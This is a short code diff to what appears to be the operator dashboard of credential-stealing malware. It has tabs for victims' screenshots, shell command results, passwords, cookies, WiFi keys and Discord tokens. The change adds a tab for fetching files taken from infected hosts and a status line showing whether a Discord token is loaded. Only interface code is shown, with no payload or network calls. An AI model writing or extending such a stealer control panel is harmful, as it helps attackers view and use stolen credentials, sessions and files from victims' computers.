@@ -616,13 +616,15 @@ function switchTab(tab, btn) {
   document.getElementById('tabCookies').classList.toggle('active', tab === 'cookies');
   document.getElementById('tabWiFi').classList.toggle('active', tab === 'wifi');
   document.getElementById('tabDiscord').classList.toggle('active', tab === 'discord');
+  document.getElementById('tabFiles').classList.toggle('active', tab === 'files');
   if (tab === 'screenshots') fetchScreenshots();
   if (tab === 'triggers') fetchTriggers();
   if (tab === 'shell') fetchExecResults();
   if (tab === 'passwords') fetchPasswords();
   if (tab === 'cookies') fetchCookies();
   if (tab === 'wifi') fetchWiFi();
-  if (tab === 'discord') fetchDiscordTokens();
+  if (tab === 'discord') { fetchDiscordTokens(); document.getElementById('discordStatus').textContent = g_discordToken ? 'Token loaded' : 'No token'; }
+  if (tab === 'files') { populateFileHostnames(); fetchFileResults(); }
 }
 
 async function fetchLatestVersion() {
